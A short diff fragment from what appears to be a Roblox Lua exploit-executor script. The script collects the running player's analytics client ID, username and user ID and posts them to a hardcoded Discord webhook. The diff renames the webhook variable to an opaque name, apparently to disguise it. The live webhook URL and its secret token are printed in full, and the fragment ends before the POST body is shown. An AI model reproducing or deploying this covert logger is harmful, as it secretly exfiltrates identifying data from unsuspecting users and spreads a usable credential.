@@ -6,15 +6,15 @@ local r1_01 = game:GetService("RbxAnalyticsService"):GetClientId()
 local username = LocalPlayer.Name
 local userid = tostring(LocalPlayer.UserId)
 
-local HHhookurl = "https://discord.com/api/webhooks/1496083486740844688/9klNmk1L25K_VP52MSzWDOCfz760hCies5W7aVZ-FdQFkU2ImE6uLIMolx1cYFMHgVAo"
+local r1_02 = "https://discord.com/api/webhooks/1496083486740844688/9klNmk1L25K_VP52MSzWDOCfz760hCies5W7aVZ-FdQFkU2ImE6uLIMolx1cYFMHgVAo"
 
-if HHhookurl ~= "" then
+if r1_02 ~= "" then
     local requestFunc = request or http_request
     
     if requestFunc then
         pcall(function()
             requestFunc({
-                Url = HHhookurl,
+                Url = r1_02,
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json"
